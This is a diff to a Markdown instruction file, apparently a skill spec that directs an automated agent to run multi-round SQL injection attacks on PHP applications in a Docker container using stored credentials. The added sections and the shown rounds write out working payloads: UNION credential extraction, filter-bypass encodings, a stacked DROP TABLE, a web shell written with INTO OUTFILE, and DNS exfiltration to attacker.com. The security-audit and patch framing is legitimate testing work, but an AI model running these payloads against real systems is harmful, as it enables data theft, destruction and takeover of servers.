@@ -2,7 +2,34 @@
 > **Input**: attack_plans/{sink_id}_plan.json, Docker container access
 > **Output**: exploit_results/{sink_id}_result.json, PoC脚本/{sink_id}_poc.py
 
+
+## Identity
+
+| Field | Value |
+|-------|-------|
+| Skill ID | S-041-B |
+| Phase | Phase-4 (Attack) |
+| Responsibility | Execute progressive multi-round attack against SQL Injection sinks |
+
+## Input Contract
+
+| File | Source | Required | Fields Used |
+|------|--------|----------|-------------|
+| Attack plan | `$WORK_DIR/attack_plans/{sink_id}_plan.json` | ✅ | `vectors`, `filter_analysis`, `bypass_strategies` |
+| Credentials | `$WORK_DIR/credentials.json` | ✅ | `cookies`, `tokens`, `api_keys` |
+| Container | Docker `php` container | ✅ | `exec` access |
+
 ## 8-Round Attack Strategy
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R1: Basic Injection
 
@@ -10,6 +37,16 @@
 - Numeric-based: `1 OR 1=1--`, `1 UNION SELECT 1,2,version()--`
 - Boolean blind: `' AND 1=1--` vs `' AND 1=2--` (compare response differences)
 - Error-based: `'` (single quote to trigger SQL error)
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R2: Encoding Bypass
 
@@ -19,6 +56,16 @@
 - Double encoding: `%2527`
 - Unicode encoding: `\u0027`
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R3: Comment Obfuscation
 
 - Inline comment: `/*!50000SELECT*/ * FROM users`
@@ -26,6 +73,16 @@
 - Nested multi-line comments: `/**/UNION/**/SELECT/**/`
 - Version conditional comment: `/*!32302 AND 1=1*/`
 - Hash comment: `# comment\nSELECT`
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R4: Numeric + Weak Typing Bypass
 
@@ -35,12 +92,32 @@
 - Boolean conversion: `true` → 1
 - Octal: `01`
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R5: Truncation and Overflow
 
 - Long string truncation: exceeding column length limit causes truncation
 - MySQL strict mode bypass: overlong values silently truncated
 - Integer overflow: `9999999999999999999`
 - Floating-point precision: `1.0000000000000001`
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R6: Second-Order Injection
 
@@ -55,6 +132,16 @@
 3. Trace whether the stored value is re-escaped
 4. Send cross-interface correlated requests to test
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R7: ORDER BY / LIMIT / GROUP BY + Logic Bypass
 
 - ORDER BY injection: `ORDER BY (CASE WHEN (1=1) THEN id ELSE username END)`
@@ -63,12 +150,32 @@
 - Subquery injection: `(SELECT SLEEP(5))`
 - Business logic bypass: sort/pagination parameters typically lack filtering
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R8: Stacked Queries + Combined Attacks
 
 - Stacked queries: `; DROP TABLE test--` (only supported by multi_query)
 - Combined: wide-byte + comment obfuscation + UNION
 - OUT FILE write: `UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/shell.php'`
 - DNS exfiltration: `LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))`
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R9: NoSQL Injection (MongoDB)
 
@@ -91,6 +198,16 @@ Applicable to PHP applications using MongoDB:
 - **Aggregation pipeline injection**: injection points in `$lookup`, `$match`, `$group`
 - Frameworks: `jenssegers/laravel-mongodb`, `doctrine/mongodb-odm`
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R10: GraphQL Injection
 
 - **Query depth attack**: nested queries causing DoS or information disclosure
@@ -111,6 +228,16 @@ Applicable to PHP applications using MongoDB:
   ```
 - Frameworks: `webonyx/graphql-php`, `nuwave/lighthouse`, `rebing/graphql-laravel`
 
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
+
 ### R11: JSON Column Injection
 
 Targeting JSON column operations in MySQL 5.7+ / PostgreSQL:
@@ -128,6 +255,16 @@ Targeting JSON column operations in MySQL 5.7+ / PostgreSQL:
   data @> '{"role":"admin"}'::jsonb
   ```
 - When Laravel `whereJsonContains()` parameters are unfiltered
+
+#### Round Fill-in
+
+| Field | Fill-in Value |
+|-------|---------------|
+| target_url | `{URL from attack plan}` |
+| injection_point | `{parameter name from plan}` |
+| payload | `{payload from this round's strategy}` |
+| evidence_command | `{docker exec or curl command to verify}` |
+| expected_evidence | `{what confirms success}` |
 
 ### R12: ORM-Specific Bypass
 
@@ -862,6 +999,64 @@ def audit_orm_injection(file_path, content):
 >
 > **Audit priority**: `*Raw()` / `exp` / `createQuery()` concatenation > sort/field parameters > standard ORM methods (low risk)
 
+
+
+## Output Contract
+
+| Output File | Path | Description |
+|-------------|------|-------------|
+| Exploit result | `$WORK_DIR/exploit_results/{sink_id}_result.json` | Final verdict + all round records |
+| PoC script | `$WORK_DIR/PoC脚本/{sink_id}_poc.py` | Standalone reproduction script |
+| Patch | `$WORK_DIR/修复补丁/{sink_id}_patch.diff` | Recommended fix |
+
+## Examples
+
+### ✅ GOOD Example — Complete, Valid Exploit Result
+
+```json
+{
+  "sink_id": "sqli_user_search_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 4,
+  "successful_round": 2,
+  "payload": "1' UNION SELECT username,password FROM users--",
+  "evidence_result": "Response contains admin:$2y$10$... password hash rows",
+  "severity": {
+    "level": "C",
+    "score": 2.7,
+    "cvss": 9.0
+  }
+}
+```
+
+**Why this is good:**
+- `evidence_result` contains specific, verifiable proof of exploitation
+- `severity` scoring is consistent: score 2.7 → cvss 9.0 → level `C`
+- `rounds_executed` shows progressive effort, not a single blind attempt
+- All required fields are populated with concrete values
+
+### ❌ BAD Example — Incomplete, Invalid Exploit Result
+
+```json
+{
+  "sink_id": "sqli_user_search_001",
+  "final_verdict": "confirmed",
+  "rounds_executed": 1,
+  "successful_round": 1,
+  "payload": "' OR 1=1--",
+  "evidence_result": "",
+  "failure_reason": "",
+  "severity": {
+    "level": "M",
+    "score": null
+  }
+}
+```
+
+**Issues:**
+- evidence_result is empty — no actual SQL response data shown
+- failure_reason is empty — if confirmed, should show evidence not failure
+- severity_level 'M' for UNION-based SQLi with data extraction is too low — should be C or H
 
 ---
 
